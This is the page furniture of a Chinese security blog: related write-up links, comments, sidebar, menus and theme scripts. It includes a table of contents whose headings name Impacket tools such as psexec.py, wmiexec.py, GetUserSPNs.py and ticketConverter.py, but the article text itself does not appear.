4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/posts/426ca570.html" title="HMV-AkaRed靶机渗透记录"><img class="cover" src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2026-03-24</div><div class="title">HMV-AkaRed靶机渗透记录</div></div></a></div><div><a href="/posts/9c1a929b.html" title="HMV-Airbind靶机渗透记录"><img class="cover" src="/img/airbind.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2026-03-24</div><div class="title">HMV-Airbind靶机渗透记录</div></div></a></div><div><a href="/posts/9ebf288e.html" title="HMV-Buster靶机渗透记录"><img class="cover" src="/img/buster.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2026-03-24</div><div class="title">HMV-Buster靶机渗透记录</div></div></a></div><div><a href="/posts/93b60aaa.html" title="HMV-Easypwn靶机渗透记录"><img class="cover" src="/img/easypwn.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2026-03-24</div><div class="title">HMV-Easypwn靶机渗透记录</div></div></a></div><div><a href="/posts/25ac4da8.html" title="HMV-Family靶机渗透记录"><img class="cover" src="/img/family.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2026-03-24</div><div class="title">HMV-Family靶机渗透记录</div></div></a></div><div><a href="/posts/2fe8a83c.html" title="HMV-Friendly2靶机渗透记录"><img class="cover" src="/img/friendly.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2026-03-24</div><div class="title">HMV-Friendly2靶机渗透记录</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div><div class="comment-tips" id="comment-tips"><span>✅ 你无需删除空行，直接评论以获取最佳展示效果</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description">记录网安和我</div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/"><h1 class="author-info__name">Lark</h1><div class="author-info__desc">Lark</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/orangeY1" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="http://wpa.qq.com/msgrd?v=3&amp;uin=2497808261&amp;site=qq&amp;menu=yes" target="_blank" title="QQ"><i class="anzhiyufont anzhiyu-icon-qq"></i></a></div></div></div></div><div class="card-widget anzhiyu-right-widget" id="card-wechat" onclick="null"><div id="flip-wrapper"><div id="flip-content"><div class="face" style="background: url(https://bu.dusays.com/2023/01/13/63c02edf44033.png) center center / 100% no-repeat"></div><div class="back face" style="background: url(https://bu.dusays.com/2023/05/13/645fa415e8694.png) center center / 100% no-repeat"></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A1%B9%E7%9B%AE%E5%9C%B0%E5%9D%80"><span class="toc-number">1.</span> <span class="toc-text">项目地址</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#psexec-py"><span class="toc-number">2.</span> <span class="toc-text">psexec.py</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">2.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-number">2.2.</span> <span class="toc-text">工作原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%9D%E8%B5%96%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.3.</span> <span class="toc-text">依赖服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E9%9C%80%E6%B1%82"><span class="toc-number">2.4.</span> <span class="toc-text">端口需求</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%98%E7%BC%BA%E7%82%B9"><span class="toc-number">2.5.</span> <span class="toc-text">优缺点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E7%A4%BA%E4%BE%8B"><span class="toc-number">2.6.</span> <span class="toc-text">命令示例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E9%80%89%E9%A1%B9"><span class="toc-number">2.7.</span> <span class="toc-text">常用选项</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#smbexec-py"><span class="toc-number">3.</span> <span class="toc-text">smbexec.py</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B-1"><span class="toc-number">3.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86-1"><span class="toc-number">3.2.</span> <span class="toc-text">工作原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%9D%E8%B5%96%E6%9C%8D%E5%8A%A1-1"><span class="toc-number">3.3.</span> <span class="toc-text">依赖服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E9%9C%80%E6%B1%82-1"><span class="toc-number">3.4.</span> <span class="toc-text">端口需求</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%98%E7%BC%BA%E7%82%B9-1"><span class="toc-number">3.5.</span> <span class="toc-text">优缺点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E7%A4%BA%E4%BE%8B-1"><span class="toc-number">3.6.</span> <span class="toc-text">命令示例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E9%80%89%E9%A1%B9-1"><span class="toc-number">3.7.</span> <span class="toc-text">常用选项</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#atexec-py"><span class="toc-number">4.</span> <span class="toc-text">atexec.py</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B-2"><span class="toc-number">4.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86-2"><span class="toc-number">4.2.</span> <span class="toc-text">工作原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%9D%E8%B5%96%E6%9C%8D%E5%8A%A1-2"><span class="toc-number">4.3.</span> <span class="toc-text">依赖服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%AF%B7%E6%B1%82"><span class="toc-number">4.4.</span> <span class="toc-text">端口请求</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%98%E7%BC%BA%E7%82%B9-2"><span class="toc-number">4.5.</span> <span class="toc-text">优缺点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E7%A4%BA%E4%BE%8B-2"><span class="toc-number">4.6.</span> <span class="toc-text">命令示例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E9%80%89%E9%A1%B9-2"><span class="toc-number">4.7.</span> <span class="toc-text">常用选项</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#wmiexec-py"><span class="toc-number">5.</span> <span class="toc-text">wmiexec.py</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B-3"><span class="toc-number">5.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86-3"><span class="toc-number">5.2.</span> <span class="toc-text">工作原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%9D%E8%B5%96%E6%9C%8D%E5%8A%A1-3"><span class="toc-number">5.3.</span> <span class="toc-text">依赖服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E9%9C%80%E6%B1%82-2"><span class="toc-number">5.4.</span> <span class="toc-text">端口需求</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%98%E7%BC%BA%E7%82%B9-3"><span class="toc-number">5.5.</span> <span class="toc-text">优缺点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E7%A4%BA%E4%BE%8B-3"><span class="toc-number">5.6.</span> <span class="toc-text">命令示例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E9%80%89%E9%A1%B9-3"><span class="toc-number">5.7.</span> <span class="toc-text">常用选项</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#dcomexec-py"><span class="toc-number">6.</span> <span class="toc-text">dcomexec.py</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B-4"><span class="toc-number">6.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86-4"><span class="toc-number">6.2.</span> <span class="toc-text">工作原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%9D%E8%B5%96%E6%9C%8D%E5%8A%A1-4"><span class="toc-number">6.3.</span> <span class="toc-text">依赖服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E9%9C%80%E6%B1%82-3"><span class="toc-number">6.4.</span> <span class="toc-text">端口需求</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%98%E7%BC%BA%E7%82%B9-4"><span class="toc-number">6.5.</span> <span class="toc-text">优缺点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E7%A4%BA%E4%BE%8B-4"><span class="toc-number">6.6.</span> <span class="toc-text">命令示例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E9%80%89%E9%A1%B9-4"><span class="toc-number">6.7.</span> <span class="toc-text">常用选项</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GetNPUsers-py%EF%BC%88AS-REP-Roasting%EF%BC%89"><span class="toc-number">7.</span> <span class="toc-text">GetNPUsers.py（AS-REP Roasting）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GetUserSPNs-py%EF%BC%88Kerberoasting%EF%BC%89"><span class="toc-number">8.</span> <span class="toc-text">GetUserSPNs.py（Kerberoasting）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#addcomputer-py%EF%BC%88%E5%A2%9E%E5%8A%A0%E6%9C%BA%E5%99%A8%E8%B4%A6%E5%8F%B7"><span class="toc-number">9.</span> <span class="toc-text">addcomputer.py（增加机器账号)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#getST-py-%E8%AF%B7%E6%B1%82ST%EF%BC%89"><span class="toc-number">10.</span> <span class="toc-text">getST.py(请求ST）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#samrdump-py-%E6%9E%9A%E4%B8%BE%E5%9F%9F%E5%86%85%E7%94%A8%E6%88%B7"><span class="toc-number">11.</span> <span class="toc-text">samrdump.py(枚举域内用户)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ticketConverter-py-%E7%A5%A8%E6%8D%AE%E8%BD%AC%E6%8D%A2"><span class="toc-number">12.</span> <span class="toc-text">ticketConverter.py(票据转换)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">13.</span> <span class="toc-text">参考文章</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/426ca570.html" title="HMV-AkaRed靶机渗透记录">HMV-AkaRed靶机渗透记录</a><time datetime="2026-03-24T04:00:00.000Z" title="发表于 2026-03-24 12:00:00">2026-03-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/9c1a929b.html" title="HMV-Airbind靶机渗透记录"><img src="/img/airbind.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HMV-Airbind靶机渗透记录"/></a><div class="content"><a class="title" href="/posts/9c1a929b.html" title="HMV-Airbind靶机渗透记录">HMV-Airbind靶机渗透记录</a><time datetime="2026-03-24T04:00:00.000Z" title="发表于 2026-03-24 12:00:00">2026-03-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/9ebf288e.html" title="HMV-Buster靶机渗透记录"><img src="/img/buster.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HMV-Buster靶机渗透记录"/></a><div class="content"><a class="title" href="/posts/9ebf288e.html" title="HMV-Buster靶机渗透记录">HMV-Buster靶机渗透记录</a><time datetime="2026-03-24T04:00:00.000Z" title="发表于 2026-03-24 12:00:00">2026-03-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/93b60aaa.html" title="HMV-Easypwn靶机渗透记录"><img src="/img/easypwn.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HMV-Easypwn靶机渗透记录"/></a><div class="content"><a class="title" href="/posts/93b60aaa.html" title="HMV-Easypwn靶机渗透记录">HMV-Easypwn靶机渗透记录</a><time datetime="2026-03-24T04:00:00.000Z" title="发表于 2026-03-24 12:00:00">2026-03-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/25ac4da8.html" title="HMV-Family靶机渗透记录"><img src="/img/family.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HMV-Family靶机渗透记录"/></a><div class="content"><a class="title" href="/posts/25ac4da8.html" title="HMV-Family靶机渗透记录">HMV-Family靶机渗透记录</a><time datetime="2026-03-24T04:00:00.000Z" title="发表于 2026-03-24 12:00:00">2026-03-24</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2026 By <a class="footer-bar-link" href="/" title="Lark" target="_blank">Lark</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">62</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">71</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">2</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" href="https://orangey1.github.io/" title="博客"><img class="back-menu-item-icon" src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/?id=17842893138&amp;server=netease"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/air-conditioner/"><i class="anzhiyufont anzhiyu-icon-fan faa-tada" style="font-size: 0.9em;"></i><span> 小空调</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/Airbind/" style="font-size: 0.88rem;">Airbind<sup>1</sup></a><a href="/tags/AkaRed/" style="font-size: 0.88rem;">AkaRed<sup>1</sup></a><a href="/tags/Artifical/" style="font-size: 0.88rem;">Artifical<sup>1</sup></a><a href="/tags/Atom/" style="font-size: 0.88rem;">Atom<sup>1</sup></a><a href="/tags/Buster/" style="font-size: 0.88rem;">Buster<sup>1</sup></a><a href="/tags/CCTV/" style="font-size: 0.88rem;">CCTV<sup>1</sup></a><a href="/tags/Chromee/" style="font-size: 0.88rem;">Chromee<sup>1</sup></a><a href="/tags/Easypwn/" style="font-size: 0.88rem;">Easypwn<sup>1</sup></a><a href="/tags/Family/" style="font-size: 0.88rem;">Family<sup>1</sup></a><a href="/tags/Friendly/" style="font-size: 0.88rem;">Friendly<sup>1</sup></a><a href="/tags/Friendly2/" style="font-size: 0.88rem;">Friendly2<sup>1</sup></a><a href="/tags/Friendly3/" style="font-size: 0.88rem;">Friendly3<sup>1</sup></a><a href="/tags/HMV/" style="font-size: 0.88rem;">HMV<sup>34</sup></a><a href="/tags/HTB/" style="font-size: 0.88rem;">HTB<sup>21</sup></a><a href="/tags/Hero/" style="font-size: 0.88rem;">Hero<sup>1</sup></a><a href="/tags/Icecream/" style="font-size: 0.88rem;">Icecream<sup>1</sup></a><a href="/tags/Krustykrab/" style="font-size: 0.88rem;">Krustykrab<sup>1</sup></a><a href="/tags/Liceo/" style="font-size: 0.88rem;">Liceo<sup>1</sup></a><a href="/tags/Mathdop/" style="font-size: 0.88rem;">Mathdop<sup>1</sup></a><a href="/tags/Matrioshka/" style="font-size: 0.88rem;">Matrioshka<sup>1</sup></a><a href="/tags/Newbee/" style="font-size: 0.88rem;">Newbee<sup>1</sup></a><a href="/tags/OMG/" style="font-size: 0.88rem;">OMG<sup>1</sup></a><a href="/tags/Quick/" style="font-size: 0.88rem;">Quick<sup>1</sup></a><a href="/tags/Reversteg/" style="font-size: 0.88rem;">Reversteg<sup>1</sup></a><a href="/tags/Simple/" style="font-size: 0.88rem;">Simple<sup>1</sup></a><a href="/tags/SingDanceRap/" style="font-size: 0.88rem;">SingDanceRap<sup>1</sup></a><a href="/tags/Survey/" style="font-size: 0.88rem;">Survey<sup>1</sup></a><a href="/tags/TheWall/" style="font-size: 0.88rem;">TheWall<sup>1</sup></a><a href="/tags/Tryharder/" style="font-size: 0.88rem;">Tryharder<sup>1</sup></a><a href="/tags/Zero/" style="font-size: 0.88rem;">Zero<sup>1</sup></a><a href="/tags/ezRe/" style="font-size: 0.88rem;">ezRe<sup>1</sup></a><a href="/tags/p4l4nc4/" style="font-size: 0.88rem;">p4l4nc4<sup>1</sup></a><a href="/tags/quoted/" style="font-size: 0.88rem;">quoted<sup>1</sup></a><a href="/tags/todd/" style="font-size: 0.88rem;">todd<sup>1</sup></a><a href="/tags/twisted/" style="font-size: 0.88rem;">twisted<sup>1</sup></a><a href="/tags/uo/" style="font-size: 0.88rem;">uo<sup>1</sup></a><a href="/tags/%E5%90%AF%E8%88%AA/" style="font-size: 0.88rem;">启航<sup>1</sup></a><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 0.88rem;">渗透测试<sup>59</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem;">网络安全<sup>62</sup></a><a href="/tags/%E9%9D%B6%E5%9C%BA%E5%85%A5%E9%97%A8/" style="font-size: 0.88rem;">靶场入门<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="is-center" id="loading-database"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-pulse-icon"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@6.1.6/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@19.1.3/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
+var HoldLog = console.log;
+console.log = function () {};
+let now1 = new Date();
+queueMicrotask(() => {
+  const Log = function () {
+    HoldLog.apply(console, arguments);
+  }; //在恢复前输出日志
+  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
+  now1.setTime(now1.getTime() + 250);
+  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
+  const dnum = Math.floor(days);
+  const ascll = [
+    `欢迎使用安知鱼!`,
+    `生活明朗, 万物可爱`,
+    `
+        
+       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
+      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
+      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
+      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
+      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
